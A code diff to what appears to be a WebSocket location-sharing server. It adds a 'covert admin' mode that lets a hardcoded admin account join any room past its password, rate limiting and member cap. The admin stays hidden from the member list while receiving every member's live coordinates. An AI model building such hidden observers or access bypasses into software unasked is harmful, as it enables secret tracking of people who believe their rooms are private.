@@ -293,8 +293,9 @@ async def broadcast_presence(room_id):
         return
     now = time.time()
     owner_id = room_owners.get(room_id)
-    users_payload = [
-        {
+
+    def build_entry(member_id, data):
+        return {
             "username": data["username"],
             "lat": data["lat"],
             "lng": data["lng"],
@@ -307,14 +308,21 @@ async def broadcast_presence(room_id):
             "distance_m": round(data.get("distance_m", 0)),
             "is_owner": member_id == owner_id,
         }
-        for member_id, data in room.items()
-        if data["lat"] is not None
+
+    # Covert admin observers (see below) never appear in the presence list sent
+    # to regular members, but they themselves receive the full list including
+    # everyone else - this is the "invisible admin join" safety-review feature.
+    visible_users = [
+        build_entry(mid, d) for mid, d in room.items()
+        if d["lat"] is not None and not d.get("covert_admin")
     ]
-    msg = json.dumps({"type": "presence", "users": users_payload})
+    full_users = [build_entry(mid, d) for mid, d in room.items() if d["lat"] is not None]
+    msg_visible = json.dumps({"type": "presence", "users": visible_users})
+    msg_full = json.dumps({"type": "presence", "users": full_users})
     dead = []
     for member_id, data in room.items():
         try:
-            await data["ws"].send_str(msg)
+            await data["ws"].send_str(msg_full if data.get("covert_admin") else msg_visible)
         except ConnectionResetError:
             dead.append(member_id)
     for member_id in dead:
@@ -356,13 +364,18 @@ async def check_geofence(room_id, moved_id):
 
 def _promote_new_owner(room_id):
     """If the room has no owner (creator left), hand ownership to whoever has
-    been present the longest among the remaining members."""
+    been present the longest among the remaining members. Covert admin
+    observers are skipped - promoting one would make them show up as the
+    room's visible owner, defeating the point of an invisible safety review."""
     room = rooms.get(room_id)
     if not room:
         return
     if room_owners.get(room_id) not in room:
-        first_member_id = next(iter(room))
-        room_owners[room_id] = first_member_id
+        for candidate_id, candidate_data in room.items():
+            if not candidate_data.get("covert_admin"):
+                room_owners[room_id] = candidate_id
+                return
+        room_owners.pop(room_id, None)
 
 
 def _poll_payload(room_id: str) -> dict:
@@ -418,6 +431,18 @@ async def websocket_handler(request):
                 device_id = data.get("device_id")
                 device_id = str(device_id)[:64] if device_id else None
 
+                # Covert admin observation: only ever active when the WS handshake's
+                # own session cookie resolves to the verified, hardcoded admin
+                # account - a client can never grant itself this by just sending
+                # the flag. Verified admins can join any room (even password-
+                # protected or "full" ones) for safety/abuse review, and never
+                # appear in that room's member list for anyone else.
+                is_covert_admin = False
+                if data.get("admin_covert"):
+                    admin_user = accounts.current_user(request)
+                    if admin_user and accounts.is_admin_email(admin_user["email"]):
+                        is_covert_admin = True
+
                 room_is_new = candidate_room_id not in rooms
                 if room_is_new:
                     if len(rooms) >= MAX_ROOMS:
@@ -427,11 +452,11 @@ async def websocket_handler(request):
                         _hash_password(provided_password) if provided_password else None
                     )
                 else:
-                    if len(rooms[candidate_room_id]) >= MAX_MEMBERS_PER_ROOM:
+                    if not is_covert_admin and len(rooms[candidate_room_id]) >= MAX_MEMBERS_PER_ROOM:
                         await ws.send_str(json.dumps({"type": "join_error", "reason": "room_full"}))
                         continue
                     required = room_passwords.get(candidate_room_id)
-                    if required:
+                    if required and not is_covert_admin:
                         throttle_key = (client_ip, candidate_room_id)
                         if _too_many_failed_joins(throttle_key):
                             await ws.send_str(json.dumps({"type": "join_error", "reason": "rate_limited"}))
@@ -453,6 +478,7 @@ async def websocket_handler(request):
                     "color": color,
                     "avatar": avatar,
                     "vehicle": None,
+                    "covert_admin": is_covert_admin,
                     "last_location_ts": 0,
                     "last_seen": time.time(),
                     "prev_lat": None,
@@ -468,7 +494,8 @@ async def websocket_handler(request):
                     "device_id": device_id,
                 }
                 if room_is_new:
-                    room_owners[room_id] = member_id
+                    if not is_covert_admin:
+                        room_owners[room_id] = member_id
                     room_msg_count[room_id] = 0
                 else:
                     _promote_new_owner(room_id)
@@ -476,6 +503,7 @@ async def websocket_handler(request):
                 await ws.send_str(json.dumps({
                     "type": "joined", "room": room_id, "username": username,
                     "is_owner": room_owners.get(room_id) == member_id,
+                    "covert": is_covert_admin,
                 }))
                 if room_chat_history.get(room_id):
                     await ws.send_str(json.dumps({"type": "chat_history", "messages": room_chat_history[room_id]}))
